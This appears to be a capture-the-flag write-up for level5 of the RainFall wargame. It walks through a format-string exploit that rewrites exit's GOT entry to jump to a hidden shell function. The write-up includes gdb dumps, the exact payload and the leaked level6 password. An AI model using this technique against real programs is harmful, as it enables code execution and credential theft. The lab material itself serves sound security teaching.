@@ -1,0 +1,77 @@
+There is secret function o, which calls system /bin/sh
+
+(gdb) disas 
+_DYNAMIC                   __init_array_end           exit
+_GLOBAL_OFFSET_TABLE_      __init_array_start         exit@got.plt
+_IO_stdin_used             __libc_csu_fini            exit@plt
+__CTOR_END__               __libc_csu_init            fgets
+__CTOR_LIST__              __libc_start_main          fgets@got.plt
+__DTOR_END__               __libc_start_main@got.plt  fgets@plt
+__DTOR_LIST__              __libc_start_main@plt      frame_dummy
+__FRAME_END__              _edata                     m
+__JCR_END__                _end                       main
+__JCR_LIST__               _exit                      n
+__bss_start                _exit@got.plt              o
+__data_start               _exit@plt                  printf
+__do_global_ctors_aux      _fini                      printf@got.plt
+__do_global_dtors_aux      _fp_hw                     printf@plt
+__dso_handle               _init                      stdin@@GLIBC_2.0
+__gmon_start__             _start                     system
+__gmon_start__@got.plt     completed.6159             system@got.plt
+__gmon_start__@plt         data_start                 system@plt
+__i686.get_pc_thunk.bx     dtor_idx.6161 
+
+We also see that after printf, exit function is called. So we can use printf to rewrite address and call o function instead of exit.
+
+(gdb) disas exit
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:     jmp    *0x8049838
+   0x080483d6 <+6>:     push   $0x28
+   0x080483db <+11>:    jmp    0x8048370
+End of assembler dump.
+(gdb) x/x 0x8049838
+0x8049838 <exit@got.plt>:       0x080483d6
+
+0x8049838 is the addres we will write to
+
+level5@RainFall:~$ python
+Python 2.7.3 (default, Jun 22 2015, 19:43:34) 
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import struct
+>>> struct.pack("<I", 0x8049838)
+'8\x98\x04\x08'
+
+(gdb) info functions o
+All functions matching regular expression "o":
+
+Non-debugging symbols:
+0x080483c0  __gmon_start__
+0x080483c0  __gmon_start__@plt
+0x08048420  __do_global_dtors_aux
+0x080484a4  o
+0x080485a0  __do_global_ctors_aux
+
+0x080484a4 is the address we will write instead of 0x8049838
+
+0x080484a4 = 134513828
+
+(134513828 -  4) will be the width parameter
+
+The only thing left to fin is the position 
+
+level5@RainFall:~$ (python -c "print 'ADDR' +  '%p ' * 21 ") | ./level5
+ADDR0x200 0xb7fd1ac0 0xb7ff37d0 !!0x52444441!! 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0xa207025 (nil) 
+
+ADDR (0x52444441) at 4th position
+
+level5@RainFall:~$ (python -c 'print "8\x98\x04\x08" + "%134513824d" + "%4$n"' ; cat -) | ./level5 | tr -d ' '
+whoami
+8level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+level5@RainFall:~$ su level6 
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
